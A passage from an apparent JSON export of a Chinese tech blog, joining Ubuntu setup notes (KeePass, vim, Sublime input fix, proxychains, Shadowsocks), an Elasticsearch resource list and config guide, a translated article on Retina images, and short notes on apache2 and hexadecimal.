~/.ssh/config\n\n keepass\n12.04用ppa安装：\n\tsudo apt-add-repository ppa:jtaylor/keepass\n\tsudo apt-get update\n\tsudo apt-get install keepass2\n14.04在软件商店里搜keepass安装。\nGIT\nssh-keygen -t rsa -b 4096 -C \"rinetd@163.com\"\nGit设置当前分支为默认push分支\ngit config --global push.default \"current\"\n VIM\ngit clone --recursive https://github.com/sdlylshl/vimfiles .vim\nln -s .vim/gitconfig .gitconfig\nln -s .vim/vimrc .vimrc\n./powerline-fonts/install.sh\n\nsudo update-alternatives --install /usr/bin/editor editor /usr/bin/vim 1\nsudo update-alternatives --set editor /usr/bin/vim\n\nsudo update-alternatives --install /usr/bin/vi vi /usr/bin/vim 1\nsudo update-alternatives --set vi /usr/bin/vim\nlnav工具是在终端界面看日志的神器\nsudo apt-get install lnav\n\n sublime安装Sublime Text 3\nsudo add-apt-repository ppa:webupd8team/sublime-text-3\nsudo apt-get update\nsudo apt-get install sublime-installer\n【解决不能跟随】\nsudo apt-get remove fcitx-ui-qimpanel\n【在Ubuntu上SublimeText无法输入中文的解决方法】\n1.sudo apt-get install build-essential libgtk2.0-dev\nhttps://raw.githubusercontent.com/sdlylshl/sublime-imfix/master/sublime-imfix.c\ngcc -shared -o libsublime-imfix.so sublime-imfix.c pkg-config --libs --cflags gtk+-2.0 -fPIC\n  //4. mv libsublime-imfix.so $SUBLIMEHOME/\n  //5. LDPRELOAD=./libsublime-imfix.so ./sublimetext\nsudo cp libsublime-imfix.so /usr/lib/\n修改/usr/share/applications/sublimetext.desktop文件\n   sudo vim /usr/share/applications/sublimetext.desktop\n   8.打开后将Exec=/opt/sublimetext/sublimetext %F修改为\n    Exec=bash -c 'LDPRELOAD=/usr/lib/libsublime-imfix.so /opt/sublimetext/sublimetext' %F\n   9.将Exec=/opt/sublimetext/sublimetext -n修改为\n    Exec=bash -c 'LDPRELOAD=/usr/lib/libsublime-imfix.so /opt/sublimetext/sublimetext' -n\n\n 我之前用的也是百度经验的方法，这个方法有三个缺点：\n    修改了系统文件，更新sublime后会被覆盖\n    如题主所说，打开文件夹、查看安装包之类的功能都失效了\n    在sublime中新建文件并保存，新建的文件不能输入中文\n\n 之后我参考的是这篇博客的方法，其实原理是一样的，只是不再修改系统文件，而是直接从终端启动。建议到第4步就行了。\n http://blog.csdn.net/cywosp/article/details/32350899\n\n 在博客的基础之上，我配置了命令别名：\n\n # .bashrc\n alias st='LDPRELOAD=./libsublime-imfix.so subl'\n 使用这种方法，不会出现上面说的三个问题，唯一的缺点是需要从命令行启动：\n\n xx@pc $ st\n xx@pc $ st test.txt\n利用proxychains在终端使用socks5代理\ngit clone https://github.com/rofl0r/proxychains-ng.git\ncd proxychains-ng\n./configure\nmake \u0026\u0026 make install\nsudo cp ./src/proxychains.conf /etc/proxychians.conf\nsudo vim /etc/proxychains.conf\nproxychains4 wget http://xxx.com/xxx.zip\n shadowsocks\napt-get install python-pip \u0026 pip install shadowsocks\napt-get install  shadowsocks\n\n启动 ss客户端\n\n启动方法a，直接在终端用命令：\nsslocal -s 123.123.213.213 -p 6666 -b 127.0.0.1 -l 1080 -k 23333 -t 600 -m aes-256-cfb把ss启动命令写成shell脚本方便使用。\n\n启动方法b，用配置文件启动：\n配置文件存为ss.conf，格式\n {\n\"server\" : \"123.123.213.213\",\n\"serverport\" : 6666,\n\"localport\" : 1080,\n\"password\" : \"23333\",\n\"timeout\" : 600,\n\"method\" : \"aes-256-cfb\"\n}启动时使用命令：\nsslocal -c /filepath/to/ss.conf\n\n完成。\n\nPS：\na.记得在Network设置代理: 设置Socks Host指向 ss客户端的本地IP和端口, 即127.0.0.1 1080;\nb.有同学反应还是不能科学上网。说明一下，SS不同于VPN，它是走socks5协议的，一般搭配浏览器食用，对于terminal的get,wget等走http是没有帮助的。虽然有socks转http的方法，但这里就不折腾了。\n\nUPDATE=====\n\n开机启动ss(可选)\n  在/etc/rc.local中添加启动命令。\n  例如:\n  sudo  vi /etc/rc.local在exit 0前添加(这里假设你已经在第2步写好shell脚本，并命名为ssstart.sh)\n  sudo sh /path/to/sslocal/ssstart.sh如果路径和权限都没问题，在下次开机时就会启动ss了。\n\n查看ss是否已经开启，用下面这个:\nps -ef | grep sslocal\n\nbcompare\n Beyond Compare 4\nsudo apt-get update\nsudo apt-get install gdebi\nsudo gdebi bcompare-4.1.3.20814_amd64.deb","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 awsome Elasticsearch","title":"Awesome Elasticsearch","text":"http://elasticsearch-cheatsheet.jolicode.com/\n\n如果是按日期索引的日志，那么最好定期清除旧索引：\n curl -XDELETE -u USER:PASSWORD http://HOST:9200/logstash-$(date -d '-10days' +'%Y.%m.%d')\n\nelasticsearch资源汇总\n\nawesome-elasticsearch\n\n插件汇总\n\nES权威指南中文\n\nES权威指南英文\n\nES安全search-guard\n\nelasticsearch相关介绍\n\nsolr和elasticsearch对比\n\nES管理\n\nbigdesk\n\n容器化\n\nelasticsearch-cloud-kubernetes\n\nDocker Official Image packaging for elasticsearch\n\n剖析Elasticsearch集群系列\n\n英文原文\n\n剖析Elasticsearch集群系列第一篇 存储模型和读写操作\n\n剖析Elasticsearch集群系列第二篇 分布式的三个C、translog和Lucene段\n\n剖析Elasticsearch集群系列第三篇 近实时搜索、深层分页问题和搜索相关性权衡之道\n\nnested 和parent使用介绍\n\n企业使用案例\n\n使用Akka、Kafka和ElasticSearch等构建分析引擎\n\n用Elasticsearch构建电商搜索平台，一个极有代表性的基础技术架构和算法实践案例\n\n用Elasticsearch+Redis构建投诉监控系统，看Airbnb如何保证用户持续增长\n\n亿级规模的Elasticsearch优化实战\n\nElasticsearch作为时间序列数据库\n\n 索引原理\n\nES原理\n\nES analyzer\n\ndocvalues 介绍\n\nElasticSearch存储文件解析\n问题解决\n\n如何防止elasticsearch的脑裂问题\n\n9 Tips on ElasticSearch Configuration for High Performance\n\n Awesome Elasticsearch\n\n← Awesome TypeScript -= Awesome Elasticsearch =-\n\n General\nElastic Stack\nElasticsearch official website\nLogstash is a data pipeline that helps you process logs and other event data from a variety of systems\nKibana is a data analysis tool that helps to visualize your data; Kibana Manual docs\nbeats is the platform for building lightweight, open source data shippers for many types of data you want to enrich with Logstash, search and analyze in Elasticsearch, and visualize in Kibana.\n\n Open-source and free products, based on Elasticsearch\nYelp/elastalert is a modular flexible rules based alerting system written in Python\nexceptionless/Exceptionless is an error (exceptions) collecting and reporting server with client bindings for a various programming languages\nsearchkit/searchkit is a UI framework based on React to build awesome search experiences with Elasticsearch\n\nElasticsearch developer tools and utilities\n\n Development and debugging\nSense (from Elastic) A JSON aware developer console to ElasticSearch; official and very powerful\nSense (Google Chrome extension) A JSON aware developer console to ElasticSearch; unofficial but very powerful\nES-mode An Emacs major mode for interacting with Elasticsearch (similar to Sense)\nElasticsearch Cheatsheet Examples for the most used queries, API and settings for all major version of Elasticsearch\nElasticstat CLI tool displaying monitoring informations like htop\n\nImport and Export\nKnapsack plugin  is an \"swiss knife\" export/import plugin for Elasticsearch\nElasticsearch-Exporter is a command line script to import/export data from ElasticSearch to various other storage systems\nesbulk Parallel elasticsearch bulk indexing utility for the command line.\nelasticdump - tools for moving and saving indicies\n\n Elasticsearch plugins\nCluster\nsscarduzio/elasticsearch-readonlyrest-plugin Safely expose Elasticsearch REST API directly to the public\nappbaseio/dejaVu A modern, open-source data browser for Elasticsearch; landing page  \nmobz/elasticsearch-head is a powerful and essential plugin for managing your cluster, indices and mapping\nBigdesk - Live charts and statistics for elasticsearch cluster\nElastic HQ - Elasticsearch cluster management console with live monitoring and beautiful UI\nKopf - Another management plugin that have REST console and manual shard allocation\nSearch Guard - Elasticsearch security for free\n\n Other\nSIREn Join Plugin for Elasticsearch This plugin extends Elasticsearch with new search actions and a filter query parser that enables to perform a \"Filter Join\" between two set of documents (in the same index or in different indexes).\n\nIntegrations and SQL support\nNLPchina/elasticsearch-sql - Query elasticsearch using familiar SQL syntax. You can also use ES functions in SQL.\nelastic/elasticsearch-hadoop - Elasticsearch real-time search and analytics natively integrated with Hadoop (and Hive)\njprante/elasticsearch-jdbc - JDBC importer for Elasticsearch\n\n You know, for search\njprante/elasticsearch-plugin-bundle A plugin that consists of a compilation of useful Elasticsearch plugins related to indexing and searching documents\n\nKibana plugins and applications\nelastic/timelion time-series analyses application. Overview and installation guide: Timelion: The time series composer for Kibana\nKibana Alert App for Elasticsearch - Kibana plugin with monitoring, alerting and reporting capabilities\n\n Kibana Visualization plugins\nnbs-system/mapster - a visualization which allows to create live event 3d maps in Kibana\nKibana Tag Cloud Plugin - tag cloud visualization plugin based on d3-cloud plugin\n\nDiscussions and social media\n/r/elasticsearch\nElasticsearch forum\nStackoverflow\nBooks on Amazon does not fit well into this category, but worth to check this out!\nTODO: Put some good twitter accounts\n\n Tutorials\nCentralized Logging with Logstash and Kibana On Ubuntu 14.04 everything you need to now when you are creating your first Elasticsearch+Logstash+Kibana instance\ndwyl/learn-elasticsearch a getting started tutorial with a pack of valuable references\nMake Sense of your Logs: From Zero to Hero in less than an Hour! by Britta Weber demonstrates how you can build Elasticsearch + Logstash + Kibana stack to collect and discover your data\n\nArticles\n System configuration\nA Useful Elasticsearch Cheat Sheet in Times of Trouble\nThe definitive guide for Elasticsearch on Windows Azure\nElasticSearch pre-flight checklist\n9 Tips on ElasticSearch Configuration for High Performance\nDocker and elasticsearch blog post series by blog.codingtimes.com\nBest Practices in AWS\nHow to Secure Elasticsearch and Kibana with NGINX, LDAP and SSL :lock:\n\nScalable Infrastructure and performance\nTuning data ingestion performance for Elasticsearch on Azure - and not only for Azure. That's a great article about Elasticsearch Performance testing by example\nElasticsearch Indexing Performance Cheatsheet - when you plan to index large amounts of data in Elasticsearch (by Patrick Peschlow)\nElasticSearch for Logging Elasticsearch configuration tips and tricks from Sanity\nScaling Elasticsearch to Hundreds of Developers by Joseph Lynch @yelp\n10 Elasticsearch metrics to watch\nUnderstanding ElasticSearch Performance\nOur Experience of Creating Large Scale Log Search System Using ElasticSearch - topology, separate master, data and search balancers nodes\n:openfilefolder: Elasticsearch on Azure Guidance it is 10% on Azure and 90% of a very valuable general information, tips and tricks about Elasticsearch\nHow to avoid the split-brain problem in Elasticsearch\n\n Integrations\nApache Hive integration\nConnecting Tableau to ElasticSearch (READ: How to query ElasticSearch with Hive SQL and Hadoop)\nmradamlacey/elasticsearch-tableau-connector\n\nLogging\n5 Logstash Alternatives and typical use cases\n\n Alerts\nElastAlert: Alerting At Scale With Elasticsearch, Part 1 by engineeringblog.yelp.com\nElastAlert: Alerting At Scale With Elasticsearch, Part 2 by engineeringblog.yelp.com\nElastalert: implementing rich monitoring with Elasticsearch\n\nTime series\nElasticsearch as a Time Series Data Store by Felix Barnsteiner\nRunning derivatives on Voyager velocity data By Colin Goodheart-Smithe\nShewhart Control Charts via Moving Averages: Part 1 - Part 2 by Zachary Tong\nImplementing a Statistical Anomaly Detector: Part 1 - Part 2 - Part 3 by Zachary Tong\n\n Machine Learning\nClassifying images into Elasticsearch with DeepDetect (forum thread with discussion) by Emmanuel Benazera\nElasticsearch with Machine Learning (English translation) by Kunihiko Kido\nRecommender System with Mahout and Elasticsearch\n\nUse cases for elastic search\nData Infrastructure at IFTTT Elasticsearch, Kafka, Apache Spark, Redhsift, other AWS services\nOFAC compliance with ElasticSearch using AWS\nBuilding a Streaming Search Platform -\nStreaming Search on Tweets: Storm, Elasticsearch, and Redis\n\n Other\nLogZoom, a fast and lightweight substitute for Logstash\nGraylog2/graylog2-server - Free and open source log management (based on ES)\nFluentd vs. Logstash for OpenStack Log Management\nBuilding a Directory Map With ELK\nStructured logging with ELK - part 1\nSearch for :yum: Emoji with Elasticsearch :magright:\nComplete Guide to the ELK Stack\n\nVideos\n Overviews\nElasticSearch in action Thijs Feryn a begginer overview\nHow we scaled Raygun\nGetting started with ElasticSearch\nSpeed is a Key: Elasticsearch under the Hood introduction + basic performance optimization\n$$ Pluralsight: Getting Started With Elasticsearch for .NET Developers this course will introduce users to Elasticsearch, how it works, and how to use it with .NET projects.\n$$ Complete Guide to Elasticsearch Comprehensive guide to Elasticsearch, the popular search engine built on Apache Lucene\nHow Elasticsearch powers the Guardian's newsroom\nElasticsearch Query Editor in Grapfana  \n\nAdvanced\nbbuzz 2015: Adrien Grand – Algorithms and data-structures that power Lucene and Elasticsearch\nRafał Kuć - Running High Performance Fault-tolerant Elasticsearch Clusters on Docker and slides\n\nConfiguration file samples and other gists\nElasticSearch config for a write-heavy cluster - reyjrar/elasticsearch.yml\n\n Who is using elasticsearch?\nYelp,\nIFTTT,\nStackExchange,\nRaygun,\nMozilla,\nSpotify,\nCERN,\nNASA\n\nI want more! (Elasticsearch related resources)\nTechnology Explained Blog\nEagerElk\nTim Roes Blog\n\n Contributing\nMake sure you are about to post a valuable resource that belongs to this list\nUse spellchiker\nAll spelling and grammar corrections are welcome\nFork this repo, do your edits, send the pull request\nFeel free to create any new sections\nAdd yourself to the \"Contributors\" section if you will\nDo not even try to add this repo to any awesome-awesome-* lists\n\nContributors\n@dzharii, @...\n\n ← Awesome TypeScript -= Awesome Elasticsearch =-","tags":null},{"location":"//blog.pytool.com/Reship/2015-01-11-towards-a-retina-web","title":"【译】走向Retina Web","text":"在深入细节之前，有必要先明确一些关键性概念。\n\nDevice Pixels(设备像素)\n\n一个设备像素（或者称为物理像素）是显示器上最小的物理显示单元。在操作系统的调度下，每一个设备像素都有自己的颜色值和亮度值。\n\nScreen density(屏幕密度)\n\n屏幕密度指的是单位面积里物理像素的数量，通常以PPI(pixels per inch)为单位。苹果公司为它的双倍屏幕密度的显示器（double-density displays）创造了一个新词“Retina”，声称在正常的观看距离下，人眼无法在Retina显示器上分辨出单独的像素。\n\nCSS Pixels\n\nCSS pixel是浏览器使用的抽象单位，用来精确的、统一的绘制网页内容。通常，CSS pixels被称为与设备无关的像素（DIPs,device-independent pixels）。在标准密度显示器（standard-density displays）上，1 CSS pixel对应一个物理像素。\n\n    div height=\"200\" width=\"300\"/div\n\n在标准密度显示器上，上面的div会占据200  300 个物理像素。而在Retina显示器上，为了保持相同的物理大小，上面的div需要用400  600 个物理像素来渲染，如下图：\n\n物理像素与CSS pixel 的比率可以通过媒体查询的device-pixel-ratio来检测（device-pixel-ratio兼容性）。也可以通过javascript的window.devicePixelRatio来获取该比率。\n\nBitmap Pixels（位图像素）\n\n一个位图像素是栅格图像（也就是位图，png、jpg、gif等等）最小的数据单元。每一个位图像素都包含着该如何显示自己的信息，例如显示位置、颜色值等。一些图片格式还包含额外的数据，例如透明度。\n\n除了自身的分辨率外，图片在网页上还有一个抽象的尺寸，通过CSS pixels来定义。浏览器在渲染的过程中，会根据图片的CSS高度和宽度来压缩或是拉伸图片。\n\n当一个位图以原尺寸展示在标准密度显示器上时，一位图像素对应一个物理像素，就是无失真显示。而在Retina显示器上，为了保证同样的物理尺寸，需要用四倍的像素来展示，但由于单个位图像素已经无法再进一步分割，只能就近取色，导致图片变虚。\n\n解决方案\n\n下面的每一种方案都是权衡性能、实现难度、跨浏览器兼容性等之后的结果。你需要根据实际情况进行选择。\n\n方案一：通过HTML 和 CSS 控制大小\n\n最直接的方式就是通过CSS或者HTML将图片尺寸减半。例如，要提供一个200  300像素的图片（这里指的是CSS pixels）,你需要上传一张尺寸为400  600像素的图片到服务器，然后通过CSS属性或者HTML属性将其缩小50%。在标准密度显示器上，显示结果就是一张只有原图像素总数四分之一的图片，这个过程通常被称为downsampling。\n\n而在Retina显示器上，将会用四倍的物理像素数来渲染同一张图片，这样每一个物理像素就对应一个位图像素，从而图片的每一个像素都得到展现。\n\n通过下面几种技术可以实现上面的解决方案：\n\n通过HTML\n\n最简单的方式就是使用img标签的width和height属性：\n\n    img src=\"example@2x.png\" width=\"200\" height=\"300\" /\n\n需要说明：虽然指定图片高度是可选的，但是声明高度的好处是，浏览器会在图片加载之前预留出相应的位置，这就避免了图片加载完成后页面布局发生变化。\n\n通过javascript\n\n利用jQuery，可以这样写：\n\n    $(window).load(function() {\n      var images = $('img');\n        images.each(function(i) {\n          $(this).width($(this).width() / 2);\n        });\n    });\n\n通过CSS（SCSS）\n\n如果你想把有关样式的代码都放到css里的话，那么最常见的方法就是使用HTML元素的背景替换img标签，然后指定background-size属性。你可以明确指定背景图片的宽度和高度，或者是在指定了HTML元素的宽高的前提下使用background-size: contain。需要注意的是IE7、8不支持background-size\n\n    .image {\n      background-image: url(example@2x.png);\n      background-size: 200px 300px;\n      / 或者是用 background-size: contain; /\n      height: 300px;\n      width: 200px;\n    }\n\n还可以通过:before或者:after伪元素来实现：\n\n    .image-container:before {\n      background-image: url(example@2x.png);\n      background-size: 200px 300px;\n      content:'';\n      display: block;\n      height: 300px;\n      width: 200px;\n    }\n\n该技术对CSS sprite同样适用，因为background-position指定的值是相对于CSS 大小的（在这里就是 200px  300px）:\n\n    .icon {\n      background-image: url(example@2x.png);\n      background-size: 200px 300px;\n      height: 25px;\n      width: 25px;\n      \u0026.trash {\n        background-position: 25px 0;\n      }\n      \u0026.edit {\n        background-position: 25px 25px;\n      }\n    }\n\n方案一的优势：\n\n容易实现\n跨浏览器兼容\n\n方案一的不足：\n\n非Retina设备需要下载Retina资源\n在标准密度屏幕上Downsampled的图片可能会丢失一些锐利度\nIE7、8不支持background-size\n\n方案二：查询像素密度\n应对Retina最流行的方式应该就是通过查询像素密度，然后针对不同密度提供不同的资源。该方案可以用CSS或javascript来实现。\n\n通过CSS媒体查询\n大多数浏览器都以私有前缀实现了device-pixel-ratio，以及它的俩兄弟min-device-pixel-ratio 和 max-device-pixel-ratio。媒体查询再结合background-image：\n\n    .icon {\n      background-image: url(example.png);\n      background-size: 200px 300px;\n      height: 300px;\n      width: 200px;\n    }\n    \n    @media only screen and (-Webkit-min-device-pixel-ratio: 1.5),\n    only screen and (-moz-min-device-pixel-ratio: 1.5),\n    only screen and (-o-min-device-pixel-ratio: 3/2),\n    only screen and (min-device-pixel-ratio: 1.5) {\n      .icon {\n        background-image: url(example@2x.png);\n      }\n    }\n\n这里使用的比率是1.5而不是2，这样该媒体查询还可以覆盖一些非苹果设备。\n\nCSS媒体查询优势：\n\n设备只需下载相匹配的资源\n跨浏览器兼容\n像素级精确控制\n\nCSS媒体查询不足：\n\n代码冗长，尤其是大网站\n把应该由img标签展示的图片转化为背景图片属于语义错误。\n\n通过javascript\n\n像素密度可以通过javascript的window.devicePixelRatio来查询(注意：不是所有浏览器都支持devicePixelRatio)。一旦检测到高密度显示器，你就可以用高质量图片替换普通图片：\n\n    $(document).ready(function(){\n      if (window.devicePixelRatio   1) {\n        var lowresImages = $('img');\n        images.each(function(i) {\n          var lowres = $(this).attr('src');\n          var highres = lowres.replace(\".\", \"@2x.\");\n          $(this).attr('src', highres);\n        });\n      }\n    });\n\nRetina.js是一个js插件，原理类似，但是有一些额外功能，例如：忽略外部图片等等。\n\n通过javascript查询的优势：\n\n容易实现\n非Retina设备无需下载大尺寸图片\n像素级精确控制\n\n通过javascript查询的不足：\n\nRetina设备不得不下载标准图片和高质量图片\n图片替换的过程会被用户看到\n有一些浏览器不支持（例如IE和火狐）\n\n方案三：SVG(Scalable Vector Graphics)\n由于位图本身固有的性质，不可能无限制的缩放。而恰恰这是矢量图的优势所在。\n\n浏览器对svg的兼容程度\n\n使用svg资源最直接的方式就是通过img标签或者CSS background-image 或者content:url()。\n\n    img src=\"example.svg\" width=\"200\" height=\"300\" /\n\n或是通过CSS:\n\n    / 使用 background-image /\n    .image {\n      background-image: url(example.svg);\n      background-size: 200px 300px;\n      height: 200px;\n      width: 300px;\n    }\n    \n    / 使用 content:url() /\n    .image-container:before {\n      content: url(example.svg);\n      / width 和 height 对 content:url() 不起作用 /\n    }\n\n使用svg不仅可以节约宝贵的带宽资源，还可以使你的图片资源更容易维护。\n\n如果你需要支持IE7、8或是Android 2.x，那么你还需要一个fallback 方案：用对应的PNG资源替换SVG图片。通过Modernizr 来做，很简单：\n\n    .image {\n      background-image: url(example.png);\n      background-size: 200px 300px;\n    }\n    .svg {\n      .image {\n        background-image: url(example.svg);\n      }\n    }\n\n也可以通过html实现类似的fallback方案：给img标签添加自定义data属性：\n\n    img src=\"example.svg\" data-png-fallback=\"example.png\" /\n\n然后，剩下的就交给jQuery和Modernizr\n\n    $(document).ready(function(){\n      if(!Modernizr.svg) {\n        var images = $('img[data-png-fallback]');\n        images.each(function(i) {\n          $(this).attr('src', $(this).data('png-fallback'));\n        });\n      }\n    });\n\n通过html实现的fallback方案缺点就是：不支持svg的浏览器也会下载svg资源。\n\n方案三的优势：\n\n所有设备用同一套资源\n容易维护\n应对未来的变化：可以无限缩放\n\n方案三的不足：\n\n由于anti-aliasing，所以不能精确到像素\n不适合复杂的的图像，因为图片体积会非常大\nIE7、8以及早期android没有原生支持svg\n\n方案四：Icon Fonts\n\nTwitter的 bootstrap使Icon Fonts 更加的流行，该技术是通过@font-face引入基于icon的字体来代替位图icon，这样icon就不再受分辨率影响。用纯色icon代替字母的web Fonts，可以用CSS来调整样式，就像网页里其它文本一样。\n\n你可以通过Fontello, Font Builder 和Inkscape来制作自己的font。\n\n网页中使用icon fonts 最常见的方式是给特定的HTML元素(通常是span或i)赋予.icon 或.glyph class,然后使用icon对应的字符作为内容：\n\n    span class=\"icon\"a/span\n\n通过@font-face引入了自定义font后，用下面的方式使用：\n\n    .icon {\n      font-family: 'My Icon Font';\n    }\n\n另一种方式是使用:before伪元素和content属性，每个icon对应一个class：\n\n    span class=\"glyph-heart\"/span\n\nCSS:\n\n    [class^=\"glyph-\"]:before {\n      font-family: 'My Icon Font';\n    }\n    .glyph-heart:before {\n      content: 'h';\n    }\n\n方案四的优势：\n\n应对未来的变化：可以无限制缩放\n跨浏览器\n比图片资源更灵活：可以用在placeholder文本里以及其他form元素中\n\n方案四的不足：\n\n由于anti-aliasing，所以不能精确到像素\n比较难维护：修改一个icon就需要重新生成整个font\n依赖语义错误的标签（除非是用:before 或:after伪元素）\n\nFavicons\nFavicons也获得了它应有的关注度，越来越多的应用于浏览器之外，用作网站或应用的图标。\n要想适配Retina，需要导出两版.ico文件，16  16像素 和 32 * 32像素。\n\n一睹未来\n除了上面提到的几种技术，还有一些技术值得关注：\n\n-Webkit-image-set用来提供多版本背景图\n \n    例如：\n\n        .image {\n          background-image: -Webkit-image-set(url(example.png) 1x, url(example@2x.png) 2x);\n          background-size: 200px 300px;\n        }\n\nPicturefill是一个html+js解决方案，大量使用data属性和媒体查询，来给不同的媒体上下文提供不同的图片。\n\n    例如：\n\n    \tdiv data-picture\n         \tdiv data-src=\"example.png\"/div\n         \tdiv data-src=\"example@2x.png\" data-media=\"(min-device-pixel-ratio: 1.5)\"/div\n      \t!-- Fallback content for non-JS browsers --\n      \tnoscript\n        \timg src=\"example.png\" \n      \t/noscript\n    \t/div\n    \n\n原文地址：http://www.smashingmagazine.com/2012/08/20/towards-retina-web/\n\nps:虽然原文发表于2012/08/20，但对于不知该如何应对Retina的前端来说，信息量还是非常大的。\n\n  [1]: http://media.mediatemple.netdna-cdn.com/wp-content/uploads/2012/07/device-pixels.png\n  [2]: http://media.mediatemple.netdna-cdn.com/wp-content/uploads/2012/07/css-pixels.png\n  [3]: http://media.mediatemple.netdna-cdn.com/wp-content/uploads/2012/07/css-device-pixels.png\n  [4]: http://media.mediatemple.netdna-cdn.com/wp-content/uploads/2012/07/bitmap-pixels.png\n  [5]: http://media.mediatemple.netdna-cdn.com/wp-content/uploads/2012/07/css-device-bitmap-pixels.png\n  [6]: http://media.mediatemple.netdna-cdn.com/wp-content/uploads/2012/07/downsampling.png\n  [7]: http://media.mediatemple.netdna-cdn.com/wp-content/uploads/2012/07/html-sizing.png\n","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 apache2","title":"Linux命令 apache2","text":"a2dissite yun.kljiyou.com.conf\na2ensite yun.kljiyou.com.conf\n\nuseradd -d /alidata1/web/yun.kljiyou.com/ -s /usr/sbin/nologin yunkljiyou\nservice apache2 reload\nipconfig /flushdns","tags":null},{"location":"//blog.pytool.com/Reship/2015-01-20-Designer's_guide_to_DPI","title":"DESIGNER'S GUIDE TO DPI","text":"---\n\nDESIGNER'S GUIDE TO DPI\n\n 原文地址\n翻译：00_悦\n原创翻译，有不当的地方欢迎指出。转载请指明出处。谢谢！","tags":null},{"location":"//blog.pytool.com/Reship/2015-03-02-hexadecimal","title":"十六进制","text":"---\n\n基础知识\n十六进制 hexadecimal\n十六进制（简写为hex或下标16），一般用数字0到9和字母A到F表示（其中:A~F即10~15）。\n现在的16进制则普遍应用在计算机领域，这是因为将4个位元（Bit）化成单独的16进制数字不太困难。\n\n1字节可以表示成2个连续的16进制数字。可是，这种混合表示法容易令人混淆，因此需要一些字首、字尾或下标来显示。\n\n不同电脑系统、编程语言对于16进制数值有不同的表示方式：\n\nC语言、Shell、Python、Java语言及其他相近的语言使用字首“0x”，例如“0x5A3”。开头的“0”令解析器更易辨认数，而“x”则代表十六进制（就如“O”代表八进制）。在“0x”中的“x”可以大写或小写。\n在HTML，十六进制字元可以用“x”，例如\u0026#x5a3;和\u0026#1443;效果应该无异。\n在网页设计上十六进制是很常用的。HTML和CSS使用十六进制的表示法来表示网页上的特定颜色。使用 # 的符号来表示而非用个别的符号表示十六进制。24-bit 颜色可以用 #RRGGBB 的格式来表示，\n\n在URL的特殊字符也是用ASCII中的十六进位，每字节都有百份比符号（%）在前，例如： 空格就表示为%20，而中文维基百科的首页地址就是 http://zh.wikipedia.org/wiki/Wikipedia:%E9%A6%96%E9%A1%B5 （在一些现代的浏览器，如Firefox中，地址中十六进制编码会被解码成实际字符，所以在这些浏览器中中文维基百科的首页地址显示成 http://zh.wikipedia.org/wiki/Wikipedia:首页 ）\n\n表示方法表\n\n环境|格式|备注","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone支持PHP","title":"drone支持PHP","text":"ETNA Alternance","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04  ElasticSearch 配置详解","title":"ElasticSearch 配置文件详解","text":"配置文件详解\n\n配置文件位于es根目录的config目录下面，有elasticsearch.yml和logging.yml两个配置，主配置文件是elasticsearch.yml，日志配置文件是logging.yml，elasticsearch调用log4j记录日志，所以日志的配置文件可以按照默认的设置，我来介绍下elasticsearch.yml里面的选项。\n\ncluster.name: elasticsearch\n配置的集群名称，默认是elasticsearch，es服务会通过广播方式自动连接在同一网段下的es服务，通过多播方式进行通信，同一网段下可以有多个集群，通过集群名称这个属性来区分不同的集群。\n\nnode.name: \"Franz Kafka\"\n当前配置所在机器的节点名，你不设置就默认随机指定一个name列表中名字，该name列表在es的jar包中config文件夹里name.txt文件中，其中有很多作者添加的有趣名字。\n\nnode.master: true\n指定该节点是否有资格被选举成为node（注意这里只是设置成有资格， 不代表该node一定就是master），默认是true，es是默认集群中的第一台机器为master，如果这台机挂了就会重新选举master。\n\nnode.data: true\n指定该节点是否存储索引数据，默认为true。\n\nindex.numberofshards: 5\n设置默认索引分片个数，默认为5片。\n\nindex.numberofreplicas: 1\n设置默认索引副本个数，默认为1个副本。如果采用默认设置，而你集群只配置了一台机器，那么集群的健康度为yellow，也就是所有的数据都是可用的，但是某些复制没有被分配（\n\n健康度可用 curl '120.92.36.21:9200/cat/health?v' 查看， 分为绿色、黄色或红色。绿色代表一切正常，集群功能齐全，黄色意味着所有的数据都是可用的，但是某些复制没有被分配，红色则代表因为某些原因，某些数据不可用）。\n\npath.conf: /path/to/conf\n设置配置文件的存储路径，默认是es根目录下的config文件夹。\n\npath.data: /path/to/data\n设置索引数据的存储路径，默认是es根目录下的data文件夹，可以设置多个存储路径，用逗号隔开，例：\n\npath.data: /path/to/data1,/path/to/data2\n\npath.work: /path/to/work\n设置临时文件的存储路径，默认是es根目录下的work文件夹。\n\npath.logs: /path/to/logs\n设置日志文件的存储路径，默认是es根目录下的logs文件夹\n\npath.plugins: /path/to/plugins\n设置插件的存放路径，默认是es根目录下的plugins文件夹, 插件在es里面普遍使用，用来增强原系统核心功能。\n\nbootstrap.mlockall: true\n设置为true来锁住内存不进行swapping。因为当jvm开始swapping时es的效率 会降低，所以要保证它不swap，可以把ESMINMEM和ESMAXMEM两个环境变量设置成同一个值，并且保证机器有足够的内存分配给es。 同时也要允许elasticsearch的进程可以锁住内存，linux下启动es之前可以通过ulimit -l unlimited命令设置。\n\nnetwork.bindhost: 192.168.0.1\n设置绑定的ip地址，可以是ipv4或ipv6的，默认为0.0.0.0，绑定这台机器的任何一个ip。\n\nnetwork.publishhost: 192.168.0.1\n设置其它节点和该节点交互的ip地址，如果不设置它会自动判断，值必须是个真实的ip地址。\n\nnetwork.host: 192.168.0.1\n这个参数是用来同时设置bindhost和publishhost上面两个参数。\n\ntransport.tcp.port: 9300\n设置节点之间交互的tcp端口，默认是9300。\n\ntransport.tcp.compress: true\n设置是否压缩tcp传输时的数据，默认为false，不压缩。\n\nhttp.port: 9200\n设置对外服务的http端口，默认为9200。\n\nhttp.maxcontentlength: 100mb\n设置内容的最大容量，默认100mb\n\nhttp.enabled: false\n是否使用http协议对外提供服务，默认为true，开启。\n\ngateway.type: local\ngateway的类型，默认为local即为本地文件系统，可以设置为本地文件系统，分布式文件系统，hadoop的HDFS，和amazon的s3服务器等。\n\ngateway.recoverafternodes: 1\n设置集群中N个节点启动时进行数据恢复，默认为1。\n\ngateway.recoveraftertime: 5m\n设置初始化数据恢复进程的超时时间，默认是5分钟。\n\ngateway.expectednodes: 2\n设置这个集群中节点的数量，默认为2，一旦这N个节点启动，就会立即进行数据恢复。\n\ncluster.routing.allocation.nodeinitialprimariesrecoveries: 4\n初始化数据恢复时，并发恢复线程的个数，默认为4。\n\ncluster.routing.allocation.nodeconcurrentrecoveries: 